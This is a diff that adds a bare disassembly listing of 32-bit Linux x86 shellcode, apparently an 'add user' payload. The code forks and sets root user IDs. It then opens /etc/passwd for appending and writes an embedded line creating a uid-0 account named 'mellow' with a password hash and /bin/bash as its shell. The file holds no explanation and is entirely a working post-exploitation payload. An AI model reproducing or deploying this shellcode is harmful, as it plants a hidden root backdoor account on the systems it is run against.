@@ -1,0 +1,58 @@
+00000000  6A02              push byte +0x2
+00000002  58                pop eax
+00000003  CD80              int 0x80
+00000005  85C0              test eax,eax
+00000007  7406              jz 0xf
+00000009  31C0              xor eax,eax
+0000000B  B001              mov al,0x1
+0000000D  CD80              int 0x80
+0000000F  31C9              xor ecx,ecx
+00000011  31DB              xor ebx,ebx
+00000013  F7E3              mul ebx
+00000015  B0AA              mov al,0xaa
+00000017  CD80              int 0x80
+00000019  31C9              xor ecx,ecx
+0000001B  89CB              mov ebx,ecx
+0000001D  6A46              push byte +0x46
+0000001F  58                pop eax
+00000020  CD80              int 0x80
+00000022  6A05              push byte +0x5
+00000024  58                pop eax
+00000025  31C9              xor ecx,ecx
+00000027  51                push ecx
+00000028  6873737764        push dword 0x64777373
+0000002D  682F2F7061        push dword 0x61702f2f
+00000032  682F657463        push dword 0x6374652f
+00000037  89E3              mov ebx,esp
+00000039  41                inc ecx
+0000003A  B504              mov ch,0x4
+0000003C  CD80              int 0x80
+0000003E  93                xchg eax,ebx
+0000003F  E826000000        call dword 0x6a
+00000044  6D                insd
+00000045  656C              gs insb
+00000047  6C                insb
+00000048  6F                outsd
+00000049  773A              ja 0x85
+0000004B  41                inc ecx
+0000004C  7A61              jpe 0xaf
+0000004E  4A                dec edx
+0000004F  385976            cmp [ecx+0x76],bl
+00000052  636E71            arpl [esi+0x71],bp
+00000055  314759            xor [edi+0x59],eax
+00000058  3A30              cmp dh,[eax]
+0000005A  3A30              cmp dh,[eax]
+0000005C  3A3A              cmp bh,[edx]
+0000005E  2F                das
+0000005F  3A2F              cmp ch,[edi]
+00000061  62696E            bound ebp,[ecx+0x6e]
+00000064  2F                das
+00000065  626173            bound esp,[ecx+0x73]
+00000068  680A598B51        push dword 0x518b590a
+0000006D  FC                cld
+0000006E  6A04              push byte +0x4
+00000070  58                pop eax
+00000071  CD80              int 0x80
+00000073  6A01              push byte +0x1
+00000075  58                pop eax
+00000076  CD80              int 0x80
